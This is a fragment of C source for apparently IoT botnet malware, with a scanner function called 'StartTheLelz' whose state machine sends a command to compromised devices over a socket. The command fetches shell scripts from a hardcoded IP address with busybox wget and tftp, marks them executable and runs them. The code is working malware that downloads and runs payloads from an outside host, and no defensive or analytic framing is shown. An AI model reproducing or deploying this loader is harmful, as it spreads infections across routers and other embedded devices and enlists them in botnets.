...
void StartTheLelz()
{
        ...
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        ...
                        case 8:
                                {
                                        if(send(fds[i].fd, "cd /tmp || cd /var/run;busybox wget http://172.245.62.233/hac.sh;sh hac.sh;busyb ox rm -f hac.sh;busybox tftp -r tftp.sh -g 172.245.62.233;busybox chmod 777 tftp .sh;sh tftp.sh\r\n", 178, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 9;
                                }
                                break;
